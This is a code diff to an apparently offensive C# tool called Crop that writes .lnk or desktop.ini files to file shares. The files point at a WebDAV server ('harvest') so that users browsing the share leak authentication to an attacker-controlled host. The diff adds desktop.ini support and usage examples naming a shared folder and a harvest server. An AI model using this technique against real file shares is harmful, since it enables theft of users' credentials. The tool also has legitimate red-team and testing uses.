@@ -15,6 +15,8 @@ namespace Crop
         {
             ShowBanner();
 
+            Console.WriteLine("Folder:");
+            Console.WriteLine("crop.exe <output folder> desktop.ini <WebDAV server> <LNK value>");
             Console.WriteLine("LNK File:");
             Console.WriteLine("crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]");
             Console.WriteLine("crop.exe \\\\fileserver\\Common\\ crop.lnk \\\\workstation@8888\\harvest \\\\workstation@8888\\harvest");
@@ -40,7 +42,7 @@ namespace Crop
             Config.targetFilename = args[1].Trim();
             Config.targetPath = args[2].Trim();
 
-            if(!Config.targetLocation.EndsWith("\\"))
+            if (!Config.targetLocation.EndsWith("\\"))
                 Config.targetLocation = Config.targetLocation + "\\";
 
             if (Config.targetFilename.EndsWith(".lnk"))
@@ -138,6 +140,19 @@ namespace Crop
                         Console.WriteLine("[*] Writing file to: {0}", output);
                         Crop.CreateFileCrop(output);
                     }
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                }
+            }
+            else if (Config.targetFilename.ToLower() == "desktop.ini")
+            {
+                try
+                {
+                    var output = Config.targetLocation + Config.targetFilename;
+                    Console.WriteLine("[*] Writing to: {0}", output);
+                    Crop.CreateFileCrop(output);
                 }
                 catch (Exception e)
                 {
